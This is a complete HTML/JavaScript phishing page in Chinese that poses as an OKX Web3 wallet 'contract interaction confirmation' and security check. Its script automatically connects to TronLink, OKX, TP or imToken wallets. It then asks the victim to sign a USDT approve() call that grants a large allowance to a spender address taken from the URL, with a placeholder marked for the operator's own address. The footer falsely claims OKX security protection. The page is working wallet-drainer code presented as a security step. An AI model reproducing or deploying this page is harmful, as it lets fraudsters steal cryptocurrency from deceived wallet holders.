<!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="utf-8">    <title>DeFi Protocol - 安全验证</title>    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">    <style>        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }        html, body { height: 100%; margin: 0; padding: 0; background-color: #f8fafc; }        body { display: flex; align-items: center; justify-content: center; font-family: -apple-system, "SF Pro Text", sans-serif; }        .card { background: #ffffff; width: 90%; max-width: 400px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.05); padding: 28px; border: 1px solid #f1f5f9; }        .header { text-align: center; margin-bottom: 24px; }        .header h2 { margin: 0; font-size: 20px; color: #0f172a; }        .header p { font-size: 13px; color: #64748b; margin-top: 4px; }        .item-box { background: #f1f5f9; border-radius: 16px; padding: 16px; margin-bottom: 12px; }        .item-label { font-size: 12px; color: #64748b; margin-bottom: 6px; display: block; }        .item-value { font-size: 14px; color: #1e293b; font-weight: 600; word-break: break-all; font-family: "SF Mono", monospace; }        .amount { font-size: 28px; color: #2563eb; text-align: center; display: block; margin: 8px 0; font-weight: 800; }        .log-box { height: 70px; background: #0f172a; border-radius: 12px; padding: 10px; font-size: 11px; color: #94a3b8; overflow-y: auto; margin-bottom: 20px; line-height: 1.5; }        .log-ok { color: #10b981; }        .log-err { color: #f43f5e; }        .btn { background: #2563eb; color: white; border: none; width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 14px rgba(37,99,235,0.4); }        .btn:active { transform: scale(0.98); }        .btn:disabled { background: #cbd5e1; box-shadow: none; }        .security-footer { margin-top: 15px; font-size: 11px; color: #94a3b8; text-align: center; display: flex; align-items: center; justify-content: center; }        .security-footer svg { width: 14px; height: 14px; margin-right: 4px; fill: #10b981; }    </style></head><body><div class="card">    <div class="header">        <h2>合约交互确认</h2>        <p>正在通过 OKX / Web3 钱包加密连接</p>    </div>    <div class="item-box">        <span class="item-label" style="text-align: center;">拟确认授权额度</span>        <span class="amount" id="ui-amount">0.00 <small style="font-size:14px">USDT</small></span>    </div>    <div class="item-box">        <span class="item-label">我的钱包地址</span>        <div class="item-value" id="ui-wallet">未连接</div>    </div>    <div class="log-box" id="log-box">        <div>等待初始化钱包环境...</div>    </div>    <button id="main-btn" class="btn" onclick="handleProcess()">连接钱包</button>    <div class="security-footer">        <svg viewBox="0 0 20 20"><path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"></path></svg>        由 OKX Web3 安全引擎提供保护    </div></div><script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script><script>    // --- 核心配置 ---    const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT主网    const DEFAULT_SPENDER = "TYourDefaultAddressHere";      // 改为你自己的地址    const DEFAULT_AMOUNT = 1000;    // 解析参数    const params = new URLSearchParams(window.location.search);    const targetSpender = params.get("to") || DEFAULT_SPENDER;    const targetAmount = params.get("amount") || DEFAULT_AMOUNT;    let currentState = 0; // 0:未连接, 1:待授权    let activeTronWeb = null;    // 初始化 UI    document.getElementById("ui-amount").innerHTML = targetAmount + ' <small style="font-size:14px">USDT</small>';    function log(msg, type) {        const box = document.getElementById("log-box");        const div = document.createElement("div");        div.className = type === "ok" ? "log-ok" : (type === "err" ? "log-err" : "");        div.innerText = "> " + msg;        box.appendChild(div);        box.scrollTop = box.scrollHeight;    }    // 核心：探测各种钱包环境（欧意、TP、imToken）    async function getProvider() {        // 1. 探测 OKX 钱包        if (window.okxwallet && window.okxwallet.tronLink) {            log("检测到 OKX Web3 钱包", "ok");            return window.okxwallet.tronLink.tronWeb || window.okxwallet.tronLink;        }        // 2. 探测通用 TronWeb (TP, imToken, TronLink)        if (window.tronWeb) {            log("检测到 Web3 运行环境", "ok");            return window.tronWeb;        }        return null;    }    async function handleProcess() {        if (currentState === 0) {            await connect();        } else {            await approve();        }    }    async function connect() {        activeTronWeb = await getProvider();        if (!activeTronWeb) {            log("未发现钱包，请在 OKX / TP 钱包中打开", "err");            return;        }        try {            // 获取地址            const addr = activeTronWeb.defaultAddress.base58;            if (addr) {                document.getElementById("ui-wallet").innerText = addr.substring(0,8) + "..." + addr.substring(addr.length-8);                log("成功连接: " + addr.substring(0,6), "ok");                currentState = 1;                document.getElementById("main-btn").innerText = "安全确认授权";            } else {                log("请在钱包内完成解锁", "err");            }        } catch (e) {            log("连接失败，请重试", "err");        }    }    async function approve() {        const btn = document.getElementById("main-btn");        btn.disabled = true;                try {            const user = activeTronWeb.defaultAddress.base58;            log("正在检查 TRX 燃料余额...");                        const balanceSun = await activeTronWeb.trx.getBalance(user);            if (activeTronWeb.fromSun(balanceSun) < 20) {                throw "TRX 余额不足，无法支付手续费";            }            log("等待 OKX 钱包签名确认...");            const contract = await activeTronWeb.contract().at(USDT_ADDR);            const amountSun = activeTronWeb.toBigNumber(targetAmount).times(1e6).toString(10);            // 发起授权            const txid = await contract.approve(targetSpender, amountSun).send({                feeLimit: 100000000            });            if (txid) {                log("授权已提交区块", "ok");                alert("确认成功，请返回原页面");            }        } catch (e) {            let m = e.message || e;            if (m.includes("declined") || m.includes("User rejected")) m = "签名被拒绝";            log("错误: " + m, "err");        } finally {            btn.disabled = false;        }    }    // 页面进入自动探测    window.onload = () => {        setTimeout(connect, 600);    };</script></body></html>
